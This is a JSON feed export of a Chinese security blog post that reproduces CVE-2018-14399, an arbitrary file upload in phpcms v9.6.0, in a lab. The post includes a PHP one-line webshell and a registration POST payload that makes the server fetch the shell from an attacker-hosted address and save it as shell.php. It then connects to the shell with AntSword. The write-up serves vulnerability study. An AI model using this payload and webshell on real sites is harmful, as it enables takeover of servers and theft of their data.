{
    "version": "https://jsonfeed.org/version/1",
    "title": "逐梦 • All posts by \"文件上传\" tag",
    "description": "Welcome to my blog",
    "home_page_url": "https://0xdadream.github.io",
    "items": [
        {
            "id": "https://0xdadream.github.io/2021/12/02/phpcmsv9.6.0-ren-yi-wen-jian-shang-chuan-lou-dong/",
            "url": "https://0xdadream.github.io/2021/12/02/phpcmsv9.6.0-ren-yi-wen-jian-shang-chuan-lou-dong/",
            "title": "phpcmsv9.6.0任意文件上传漏洞CVE-2018-14399",
            "date_published": "2021-12-02T13:11:00.000Z",
            "content_html": "<h1 id=\"phpcmsv9-6-0任意文件上传漏洞CVE-2018-14399\"><a href=\"#phpcmsv9-6-0任意文件上传漏洞CVE-2018-14399\" class=\"headerlink\" title=\"phpcmsv9.6.0任意文件上传漏洞CVE-2018-14399\"></a>phpcmsv9.6.0任意文件上传漏洞CVE-2018-14399</h1><h2 id=\"搭建环境\"><a href=\"#搭建环境\" class=\"headerlink\" title=\"搭建环境\"></a>搭建环境</h2><p>下载phpcmsv9.6.0，然后安装</p>\n<p>登录到后台</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/e0e5d69445e98d8dea8663a94929c0ce.jpg\"></p>\n<h2 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h2><p>进入注册页面，填写注册信息</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/35792f526406248ea5cf080047820369.png\"></p>\n<p>点击注册bp抓包</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/cc4b00f681c6f7fbca23b81c6e795726.png\"></p>\n<p>在另一个开启web服务的主机的web根目录下创建一个txt文件，写入一句话木马</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token function\">eavl</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>构造poc</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token assign-left variable\">siteid</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">modelid</span><span class=\"token operator\">=</span><span class=\"token number\">10</span><span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">username</span><span class=\"token operator\">=</span>test<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">password</span><span class=\"token operator\">=</span>testtest<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">pwdconfirm</span><span class=\"token operator\">=</span>testtest<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">email</span><span class=\"token operator\">=</span>test%40gmail.com<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">nickname</span><span class=\"token operator\">=</span>test<span class=\"token operator\">&amp;</span>info<span class=\"token punctuation\">[</span>content<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>img <span class=\"token assign-left variable\">src</span><span class=\"token operator\">=</span>http://xxxxxip/shell.txt?.php<span class=\"token comment\">#.jpg&gt;&amp;dosubmit=1&amp;protocol=</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>添加poc到包中</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/3b48dde6309666674c3b12712b704fb9.png\"></p>\n<p>发送包，然后从响应中获得shell.php的路径，再通过蚁剑连接</p>\n",
            "tags": [
                "代码审计",
                "漏洞复现",
                "文件上传"
            ]
        }
    ]
}